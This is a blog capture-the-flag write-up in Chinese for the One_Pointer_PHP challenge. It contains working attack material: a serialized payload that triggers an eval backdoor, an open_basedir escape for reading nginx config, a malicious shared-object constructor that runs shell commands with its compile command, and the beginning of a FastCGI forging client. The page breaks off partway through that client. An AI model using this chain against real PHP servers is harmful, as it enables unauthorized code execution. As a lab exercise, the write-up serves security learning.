



<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#FFF">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">


<link rel="alternate" type="application/rss+xml" title="Hexo" href="http://odiws.github.io/rss.xml" />
<link rel="alternate" type="application/atom+xml" title="Hexo" href="http://odiws.github.io/atom.xml" />
<link rel="alternate" type="application/json" title="Hexo" href="http://odiws.github.io/feed.json" />

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="/css/app.css?v=0.2.5">

  
  <meta name="keywords" content="buuctf,fastcgi-php-FPM,disable_function" />


<link rel="canonical" href="http://odiws.github.io/2024/11/07/%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/">



  <title>
[蓝帽杯_2021]One_Pointer_PHP - 刷题笔记 |
zty153’s_blog = Hexo</title>
<meta name="generator" content="Hexo 7.3.0"></head>
<body itemscope itemtype="http://schema.org/WebPage">
  <div id="loading">
    <div class="cat">
      <div class="body"></div>
      <div class="head">
        <div class="face"></div>
      </div>
      <div class="foot">
        <div class="tummy-end"></div>
        <div class="bottom"></div>
        <div class="legs left"></div>
        <div class="legs right"></div>
      </div>
      <div class="paw">
        <div class="hands left"></div>
        <div class="hands right"></div>
      </div>
    </div>
  </div>
  <div id="container">
    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="inner">
        <div id="brand">
          <div class="pjax">
          
  <h1 itemprop="name headline">[蓝帽杯_2021]One_Pointer_PHP
  </h1>
  
<div class="meta">
  <span class="item" title="Created: 2024-11-07 21:27:47">
    <span class="icon">
      <i class="ic i-calendar"></i>
    </span>
    <span class="text">Posted on</span>
    <time itemprop="dateCreated datePublished" datetime="2024-11-07T21:27:47+08:00">2024-11-07</time>
  </span>
</div>


          </div>
        </div>
        <nav id="nav">
  <div class="inner">
    <div class="toggle">
      <div class="lines" aria-label="Toggle navigation bar">
        <span class="line"></span>
        <span class="line"></span>
        <span class="line"></span>
      </div>
    </div>
    <ul class="menu">
      <li class="item title"><a href="/" rel="start">zty153’s_blog</a></li>
    </ul>
    <ul class="right">
      <li class="item theme">
        <i class="ic i-sun"></i>
      </li>
      <li class="item search">
        <i class="ic i-search"></i>
      </li>
    </ul>
  </div>
</nav>

      </div>
      <div id="imgs" class="pjax">
        <ul>
          <li class="item" data-background-image="https://www.loliapi.com/acg/?828185"></li>
          <li class="item" data-background-image="https://www.loliapi.com/acg/?796403"></li>
          <li class="item" data-background-image="https://www.loliapi.com/acg/?114444"></li>
          <li class="item" data-background-image="https://www.loliapi.com/acg/?900577"></li>
          <li class="item" data-background-image="https://www.loliapi.com/acg/?360530"></li>
          <li class="item" data-background-image="https://www.loliapi.com/acg/?65094"></li>
        </ul>
      </div>
    </header>
    <div id="waves">
      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
        <defs>
          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
        </defs>
        <g class="parallax">
          <use xlink:href="#gentle-wave" x="48" y="0" />
          <use xlink:href="#gentle-wave" x="48" y="3" />
          <use xlink:href="#gentle-wave" x="48" y="5" />
          <use xlink:href="#gentle-wave" x="48" y="7" />
        </g>
      </svg>
    </div>
    <main>
      <div class="inner">
        <div id="main" class="pjax">
          
  <div class="article wrap">
    
<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
<i class="ic i-home"></i>
<span><a href="/">Home</a></span><i class="ic i-angle-right"></i>
<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" itemprop="item" rel="index" title="In 刷题笔记"><span itemprop="name">刷题笔记</span></a>
<meta itemprop="position" content="1" /></span>
</div>

    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="en">
  <link itemprop="mainEntityOfPage" href="http://odiws.github.io/2024/11/07/%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/">

  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="image" content="/images/avatar.jpg">
    <meta itemprop="name" content="odiws">
    <meta itemprop="description" content=", ">
  </span>

  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="Hexo">
  </span>

  <div class="body md" itemprop="articleBody">
    

    <h2 id="蓝帽杯_2021one_pointer_php"><a class="anchor" href="#蓝帽杯_2021one_pointer_php">#</a> [蓝帽杯_2021] One_Pointer_PHP</h2>
<p>add_api.php 的漏洞（给了源码）:</p>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$count</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	<span class="token variable">$count</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token property">count</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$count</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>		<span class="token variable">$user</span><span class="token operator">-></span><span class="token property">count</span><span class="token operator">+=</span><span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>		<span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>	<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>		<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"backdoor"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>	<span class="token variable">$user</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>	<span class="token variable">$user</span><span class="token operator">-></span><span class="token property">count</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>	<span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token delimiter important">?></span></span></pre></td></tr></table></figure><h4 id="php-数组溢出绕过限制"><a class="anchor" href="#php-数组溢出绕过限制">#</a> PHP 数组溢出绕过限制：</h4>
<p>当数组里面的个数为 PHP_INT_MAX 时，数值时会报错</p>
<p>当给一个数组的 <code>PHP_INT_MAX + 1</code>  索引赋值时，会爆 warning，不同位数的操作系统 PHP_INT_MAX 值不同，32 位的是 <code>0x7FFFFFFF</code> ，64 位的是 <code>0x7FFFFFFFFFFFFFFF</code></p>
<p>因此我们这里传入 <code>$user-&gt;count = 0x7FFFFFFFFFFFFFFF - 1</code>  (9223372036854775806) 可以绕过</p>
<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202411072141931.png" alt="image-20241107214151756" /></p>
<pre><code>O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A9223372036854775806%3B%7D
</code></pre>
<p>即可绕过</p>
<h4 id="读配置文件"><a class="anchor" href="#读配置文件">#</a> 读配置文件</h4>
<p>先看 phpinfo () 里面禁了些什么函数</p>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>stream_socket_client<span class="token punctuation">,</span>fsockopen<span class="token punctuation">,</span>putenv<span class="token punctuation">,</span>pcntl_alarm<span class="token punctuation">,</span>pcntl_fork<span class="token punctuation">,</span>pcntl_waitpid<span class="token punctuation">,</span>pcntl_wait<span class="token punctuation">,</span>pcntl_wifexited<span class="token punctuation">,</span>pcntl_wifstopped<span class="token punctuation">,</span>pcntl_wifsignaled<span class="token punctuation">,</span>pcntl_wifcontinued<span class="token punctuation">,</span>pcntl_wexitstatus<span class="token punctuation">,</span>pcntl_wtermsig<span class="token punctuation">,</span>pcntl_wstopsig<span class="token punctuation">,</span>pcntl_signal<span class="token punctuation">,</span>pcntl_signal_get_handler<span class="token punctuation">,</span>pcntl_signal_dispatch<span class="token punctuation">,</span>pcntl_get_last_error<span class="token punctuation">,</span>pcntl_strerror<span class="token punctuation">,</span>pcntl_sigprocmask<span class="token punctuation">,</span>pcntl_sigwaitinfo<span class="token punctuation">,</span>pcntl_sigtimedwait<span class="token punctuation">,</span>pcntl_exec<span class="token punctuation">,</span>pcntl_getpriority<span class="token punctuation">,</span>pcntl_setpriority<span class="token punctuation">,</span>pcntl_async_signals<span class="token punctuation">,</span>iconv<span class="token punctuation">,</span>system<span class="token punctuation">,</span>exec<span class="token punctuation">,</span>shell_exec<span class="token punctuation">,</span>popen<span class="token punctuation">,</span>proc_open<span class="token punctuation">,</span>passthru<span class="token punctuation">,</span>symlink<span class="token punctuation">,</span>link<span class="token punctuation">,</span>syslog<span class="token punctuation">,</span>imap_open<span class="token punctuation">,</span>dl<span class="token punctuation">,</span>mail<span class="token punctuation">,</span>error_log<span class="token punctuation">,</span>debug_backtrace<span class="token punctuation">,</span>debug_print_backtrace<span class="token punctuation">,</span>gc_collect_cycles<span class="token punctuation">,</span>array_merge_recursive</pre></td></tr></table></figure><p>肯定是不能直接命令执行了，得绕 disable_function，还有 open_basedir 的限制目录，但是 file_put_contents 函数（写文件）（第一个参数文件名，第二个是内容，若是一句话木马就得用单引号）和 file_get_contents 函数（读文件双引号就行）</p>
<h4 id="绕过open_basedir读敏感文件"><a class="anchor" href="#绕过open_basedir读敏感文件">#</a> 绕过 open_basedir 读敏感文件</h4>
<p>由于是 php，且在 phpinfo 中看到了 FPM/FastCGI，可以知道是 php-fpm 进程管理的 FastCGI。于是读一下 nginx 相关的配置文件</p>
<ul>
<li>/etc/nginx/nginx.conf：先读这个，发现有 include /etc/nginx/sites-enabled/*</li>
<li>/etc/nginx/sites-enabled/default：再读这个</li>
</ul>
<pre><code>mkdir('c');
chdir('c');
ini_set('open_basedir','..');
chdir('..');chdir('..');chdir('..');
chdir('..');chdir('..');chdir('..');chdir('..');
ini_set('open_basedir','/');
var_dump(file_get_contents(&quot;/etc/nginx/nginx.conf&quot;));
</code></pre>
<p>读了之后发现 php-fpm 的端口是 9001，且使用的 TCP 连接的</p>
<pre><code>location ~ \.php$ &#123;
root           html;
fastcgi_pass   127.0.0.1:9001;
fastcgi_index  index.php;
fastcgi_param  SCRIPT_FILENAME  /var/www/html/$fastcgi_script_name;
include        fastcgi_params;
&#125;
</code></pre>
<p>尝试打了一下 FPM 未授权访问的 RCE，发现弹不回 shell，直接打貌似打不通。</p>
<p><span class="exturl" data-url="aHR0cDovL3huLS1GYXN0Q0dJLThyNWtvMXg5bTFiZG5iZjMzMGFremIuc28=">伪造 FastCGI 加载恶意.so</span></p>
<p>c 文件：</p>
<pre><code class="language-c++">#define _GNU_SOURCE
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

__attribute__ ((__constructor__)) void preload (void)&#123;
    system(&quot;ls / &gt;/var/www/html/dd&quot;);
&#125;
</code></pre>
<p>在 linux 上编译一下：</p>
<pre><code>gcc hpdoger.c -fPIC -shared -o hpdoger.so
</code></pre>
<p>上传文件到 /var/www/html 或者 /tmp/ 下都行（得先写马连接蚁剑，在进行上传）</p>
<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202411072212329.png" alt="image-20241107221222292" /></p>
<p>然后就用加载恶意 so 文件的这个 php 文件的运行后的东西留着</p>
<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202411072154542.png" alt="image-20241107215406307" /></p>
<p>接下来要寻找一种方式来把我们的恶意 bin 发送到 php-fpm 的 9001 端口上，这里我们需要考虑 PHP Stream Wrapper (php 支持和封装的协议) 下有没有什么可以利用的协议，然后配合 <code>file_put_contents</code>  通过 SSRF 的方式打到 9001 上</p>
<pre><code>file:// — 访问本地文件系统
这里有权限限制，无法读取任意文件

http:// — 访问 HTTP(s) 网址
端口探测，不能发送数据

php:// — 访问各个输入/输出流（I/O streams）

zlib:// — 压缩流

data:// — 数据（RFC 2397）

glob:// — 查找匹配的文件路径模式

压根就没用

phar:// — PHP 归档
没链子，打不了

ssh2:// — Secure Shell 2

rar:// — RAR

ogg:// — 音频流

expect:// — 处理交互式的流

上面四个需要安装PECL扩展，本身也无法利用
</code></pre>
<p>最后就只剩下 FTP 协议满足我们的要求了，既可以发送数据，又正好不受其他权限的限制</p>
<p>pwn.php 生成 bin 码：</p>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">/**</pre></td></tr><tr><td data-num="3"></td><td><pre> * Note : Code is released under the GNU LGPL</pre></td></tr><tr><td data-num="4"></td><td><pre> *</pre></td></tr><tr><td data-num="5"></td><td><pre> * Please do not change the header of this file</pre></td></tr><tr><td data-num="6"></td><td><pre> *</pre></td></tr><tr><td data-num="7"></td><td><pre> * This library is free software; you can redistribute it and/or modify it under the terms of the GNU</pre></td></tr><tr><td data-num="8"></td><td><pre> * Lesser General Public License as published by the Free Software Foundation; either version 2 of</pre></td></tr><tr><td data-num="9"></td><td><pre> * the License, or (at your option) any later version.</pre></td></tr><tr><td data-num="10"></td><td><pre> *</pre></td></tr><tr><td data-num="11"></td><td><pre> * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;</pre></td></tr><tr><td data-num="12"></td><td><pre> * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</pre></td></tr><tr><td data-num="13"></td><td><pre> *</pre></td></tr><tr><td data-num="14"></td><td><pre> * See the GNU Lesser General Public License for more details.</pre></td></tr><tr><td data-num="15"></td><td><pre> */</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token comment">/**</pre></td></tr><tr><td data-num="17"></td><td><pre> * Handles communication with a FastCGI application</pre></td></tr><tr><td data-num="18"></td><td><pre> *</pre></td></tr><tr><td data-num="19"></td><td><pre> * @author      Pierrick Charron &lt;pierrick@webstart.fr></pre></td></tr><tr><td data-num="20"></td><td><pre> * @version     1.0</pre></td></tr><tr><td data-num="21"></td><td><pre> */</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">FCGIClient</span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token keyword">const</span> <span class="token constant">VERSION_1</span>            <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token keyword">const</span> <span class="token constant">BEGIN_REQUEST</span>        <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token keyword">const</span> <span class="token constant">ABORT_REQUEST</span>        <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token keyword">const</span> <span class="token constant">END_REQUEST</span>          <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    <span class="token keyword">const</span> <span class="token constant">PARAMS</span>               <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    <span class="token keyword">const</span> <span class="token constant">STDIN</span>                <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>    <span class="token keyword">const</span> <span class="token constant">STDOUT</span>               <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token keyword">const</span> <span class="token constant">STDERR</span>               <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>    <span class="token keyword">const</span> <span class="token constant">DATA</span>                 <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>    <span class="token keyword">const</span> <span class="token constant">GET_VALUES</span>           <span class="token operator">=</span> <span class="token number">9</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>    <span class="token keyword">const</span> <span class="token constant">GET_VALUES_RESULT</span>    <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>    <span class="token keyword">const</span> <span class="token constant">UNKNOWN_TYPE</span>         <span class="token operator">=</span> <span class="token number">11</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>    <span class="token keyword">const</span> <span class="token constant">MAXTYPE</span>              <span class="token operator">=</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">UNKNOWN_TYPE</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>    <span class="token keyword">const</span> <span class="token constant">RESPONDER</span>            <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>    <span class="token keyword">const</span> <span class="token constant">AUTHORIZER</span>           <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>    <span class="token keyword">const</span> <span class="token constant">FILTER</span>               <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>    <span class="token keyword">const</span> <span class="token constant">REQUEST_COMPLETE</span>     <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>    <span class="token keyword">const</span> <span class="token constant">CANT_MPX_CONN</span>        <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>    <span class="token keyword">const</span> <span class="token constant">OVERLOADED</span>           <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="43"></td><td><pre>    <span class="token keyword">const</span> <span class="token constant">UNKNOWN_ROLE</span>         <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>    <span class="token keyword">const</span> <span class="token constant">MAX_CONNS</span>            <span class="token operator">=</span> <span class="token string single-quoted-string">'MAX_CONNS'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="45"></td><td><pre>    <span class="token keyword">const</span> <span class="token constant">MAX_REQS</span>             <span class="token operator">=</span> <span class="token string single-quoted-string">'MAX_REQS'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="46"></td><td><pre>    <span class="token keyword">const</span> <span class="token constant">MPXS_CONNS</span>           <span class="token operator">=</span> <span class="token string single-quoted-string">'MPXS_CONNS'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="47"></td><td><pre>    <span class="token keyword">const</span> <span class="token constant">HEADER_LEN</span>           <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="48"></td><td><pre>    <span class="token comment">/**</pre></td></tr><tr><td data-num="49"></td><td><pre>     * Socket</pre></td></tr><tr><td data-num="50"></td><td><pre>     * @var Resource</pre></td></tr><tr><td data-num="51"></td><td><pre>     */</span></pre></td></tr><tr><td data-num="52"></td><td><pre>    <span class="token keyword">private</span> <span class="token variable">$_sock</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="53"></td><td><pre>    <span class="token comment">/**</pre></td></tr><tr><td data-num="54"></td><td><pre>     * Host</pre></td></tr><tr><td data-num="55"></td><td><pre>     * @var String</pre></td></tr><tr><td data-num="56"></td><td><pre>     */</span></pre></td></tr><tr><td data-num="57"></td><td><pre>    <span class="token keyword">private</span> <span class="token variable">$_host</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="58"></td><td><pre>    <span class="token comment">/**</pre></td></tr><tr><td data-num="59"></td><td><pre>     * Port</pre></td></tr><tr><td data-num="60"></td><td><pre>     * @var Integer</pre></td></tr><tr><td data-num="61"></td><td><pre>     */</span></pre></td></tr><tr><td data-num="62"></td><td><pre>    <span class="token keyword">private</span> <span class="token variable">$_port</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="63"></td><td><pre>    <span class="token comment">/**</pre></td></tr><tr><td data-num="64"></td><td><pre>     * Keep Alive</pre></td></tr><tr><td data-num="65"></td><td><pre>     * @var Boolean</pre></td></tr><tr><td data-num="66"></td><td><pre>     */</span></pre></td></tr><tr><td data-num="67"></td><td><pre>    <span class="token keyword">private</span> <span class="token variable">$_keepAlive</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="68"></td><td><pre>    <span class="token comment">/**</pre></td></tr><tr><td data-num="69"></td><td><pre>     * Constructor</pre></td></tr><tr><td data-num="70"></td><td><pre>     *</pre></td></tr><tr><td data-num="71"></td><td><pre>     * @param String $host Host of the FastCGI application</pre></td></tr><tr><td data-num="72"></td><td><pre>     * @param Integer $port Port of the FastCGI application</pre></td></tr><tr><td data-num="73"></td><td><pre>     */</span></pre></td></tr><tr><td data-num="74"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">,</span> <span class="token variable">$port</span> <span class="token operator">=</span> <span class="token number">9001</span><span class="token punctuation">)</span> <span class="token comment">// and default value for port, just for unixdomain socket</span></pre></td></tr><tr><td data-num="75"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="76"></td><td><pre>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_host</span> <span class="token operator">=</span> <span class="token variable">$host</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="77"></td><td><pre>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_port</span> <span class="token operator">=</span> <span class="token variable">$port</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="78"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="79"></td><td><pre>    <span class="token comment">/**</pre></td></tr><tr><td data-num="80"></td><td><pre>     * Define whether or not the FastCGI application should keep the connection</pre></td></tr><tr><td data-num="81"></td><td><pre>     * alive at the end of a request</pre></td></tr><tr><td data-num="82"></td><td><pre>     *</pre></td></tr><tr><td data-num="83"></td><td><pre>     * @param Boolean $b true if the connection should stay alive, false otherwise</pre></td></tr><tr><td data-num="84"></td><td><pre>     */</span></pre></td></tr><tr><td data-num="85"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">setKeepAlive</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="86"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="87"></td><td><pre>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_keepAlive</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">boolean</span><span class="token punctuation">)</span><span class="token variable">$b</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="88"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_keepAlive</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="89"></td><td><pre>            <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="90"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="91"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="92"></td><td><pre>    <span class="token comment">/**</pre></td></tr><tr><td data-num="93"></td><td><pre>     * Get the keep alive status</pre></td></tr><tr><td data-num="94"></td><td><pre>     *</pre></td></tr><tr><td data-num="95"></td><td><pre>     * @return Boolean true if the connection should stay alive, false otherwise</pre></td></tr><tr><td data-num="96"></td><td><pre>     */</span></pre></td></tr><tr><td data-num="97"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getKeepAlive</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="98"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="99"></td><td><pre>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_keepAlive</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="100"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="101"></td><td><pre>    <span class="token comment">/**</pre></td></tr><tr><td data-num="102"></td><td><pre>     * Create a connection to the FastCGI application</pre></td></tr><tr><td data-num="103"></td><td><pre>     */</span></pre></td></tr><tr><td data-num="104"></td><td><pre>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="105"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="106"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="107"></td><td><pre>            <span class="token comment">//$this->_sock = fsockopen($this->_host, $this->_port, $errno, $errstr, 5);</span></pre></td></tr><tr><td data-num="108"></td><td><pre>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span> <span class="token operator">=</span> <span class="token function">stream_socket_client</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_host</span><span class="token punctuation">,</span> <span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="109"></td><td><pre>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="110"></td><td><pre>                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Unable to connect to FastCGI application'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="111"></td><td><pre>            <span class="token 